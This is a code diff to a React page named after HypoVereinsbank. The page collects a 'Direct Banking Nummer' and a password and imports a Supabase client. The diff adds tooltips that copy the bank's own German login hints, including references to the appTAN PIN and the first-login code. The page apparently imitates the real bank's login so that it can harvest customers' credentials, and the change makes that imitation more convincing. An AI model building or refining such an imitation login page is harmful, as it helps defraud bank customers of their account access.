@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
@@ -41,6 +41,130 @@ const NAV_ITEMS = [
   "Services",
 ];
 
+const HINT_BG = "#bfebf3";
+const HINT_FG = "#262626";
+const HINT_X = "#007a91";
+
+const InfoHint = ({
+  open,
+  onToggle,
+  onClose,
+  children,
+}: {
+  open: boolean;
+  onToggle: () => void;
+  onClose: () => void;
+  children: React.ReactNode;
+}) => {
+  const wrapRef = useRef<HTMLSpanElement>(null);
+  useEffect(() => {
+    if (!open) return;
+    const handler = (e: MouseEvent) => {
+      if (wrapRef.current && !wrapRef.current.contains(e.target as Node)) onClose();
+    };
+    document.addEventListener("mousedown", handler);
+    return () => document.removeEventListener("mousedown", handler);
+  }, [open, onClose]);
+
+  return (
+    <span ref={wrapRef} className="relative inline-flex items-center">
+      <button
+        type="button"
+        onClick={(e) => {
+          e.preventDefault();
+          onToggle();
+        }}
+        aria-label="Hinweis anzeigen"
+        className="inline-flex items-center justify-center rounded-full"
+        style={{
+          width: 16,
+          height: 16,
+          backgroundColor: "#8a8a8a",
+          color: "#fff",
+          fontSize: 11,
+          fontWeight: 700,
+          fontFamily: "Georgia, serif",
+          lineHeight: 1,
+        }}
+      >
+        i
+      </button>
+      {open && (
+        <span
+          role="dialog"
+          className="absolute z-20 hidden lg:block"
+          style={{
+            left: "calc(100% + 14px)",
+            top: "50%",
+            transform: "translateY(-50%)",
+            width: 300,
+            backgroundColor: HINT_BG,
+            color: HINT_FG,
+            border: `1px solid ${HINT_FG}`,
+            padding: "12px 28px 12px 14px",
+            fontSize: 13,
+            lineHeight: 1.45,
+          }}
+        >
+          {/* Arrow border */}
+          <span
+            aria-hidden="true"
+            style={{
+              position: "absolute",
+              left: -8,
+              top: "50%",
+              transform: "translateY(-50%)",
+              width: 0,
+              height: 0,
+              borderTop: "8px solid transparent",
+              borderBottom: "8px solid transparent",
+              borderRight: `8px solid ${HINT_FG}`,
+            }}
+          />
+          {/* Arrow fill */}
+          <span
+            aria-hidden="true"
+            style={{
+              position: "absolute",
+              left: -7,
+              top: "50%",
+              transform: "translateY(-50%)",
+              width: 0,
+              height: 0,
+              borderTop: "7px solid transparent",
+              borderBottom: "7px solid transparent",
+              borderRight: `7px solid ${HINT_BG}`,
+            }}
+          />
+          <button
+            type="button"
+            onClick={(e) => {
+              e.preventDefault();
+              onClose();
+            }}
+            aria-label="Schließen"
+            className="absolute"
+            style={{
+              top: 4,
+              right: 6,
+              color: HINT_X,
+              fontSize: 18,
+              lineHeight: 1,
+              fontWeight: 700,
+              background: "transparent",
+              border: "none",
+              cursor: "pointer",
+            }}
+          >
+            ×
+          </button>
+          {children}
+        </span>
+      )}
+    </span>
+  );
+};
+
 const Hypovereinsbank = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
@@ -48,6 +172,7 @@ const Hypovereinsbank = () => {
   const [showLoading, setShowLoading] = useState(false);
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
+  const [openHint, setOpenHint] = useState<null | "user" | "pw">(null);
 
   useEffect(() => {
     window.scrollTo(0, 0);
@@ -211,7 +336,14 @@ const Hypovereinsbank = () => {
 
                   <label className="block mb-4">
                     <span className="flex items-center gap-1.5 text-[14px] mb-1" style={{ color: DARK }}>
-                      Direct Banking Nummer <Info size={13} style={{ color: TEAL }} />
+                      Direct Banking Nummer
+                      <InfoHint
+                        open={openHint === "user"}
+                        onToggle={() => setOpenHint(openHint === "user" ? null : "user")}
+                        onClose={() => setOpenHint(null)}
+                      >
+                        Ihre Direct Banking Nummer finden Sie in Ihren Anmeldeunterlagen.
+                      </InfoHint>
                     </span>
                     <input
                       type="text"
@@ -225,7 +357,19 @@ const Hypovereinsbank = () => {
 
                   <label className="block mb-5">
                     <span className="flex items-center gap-1.5 text-[14px] mb-1" style={{ color: DARK }}>
-                      Passwort <Info size={13} style={{ color: TEAL }} />
+                      Passwort
+                      <InfoHint
+                        open={openHint === "pw"}
+                        onToggle={() => setOpenHint(openHint === "pw" ? null : "pw")}
+                        onClose={() => setOpenHint(null)}
+                      >
+                        <p className="mb-2">
+                          Bitte prüfen Sie, ob Sie Ihr 6-10-stelliges Passwort verwendet haben und nicht versehentlich Ihre appTAN PIN (Zahlenkombination, nur für Transaktionsfreigaben).
+                        </p>
+                        <p>
+                          Sollten Sie sich erstmalig zum Online Banking anmelden, verwenden Sie bitte Ihren 5-stelligen Einstiegscode, welchen Sie bei der Registrierung erhalten haben.
+                        </p>
+                      </InfoHint>
                     </span>
                     <input
                       type="password"
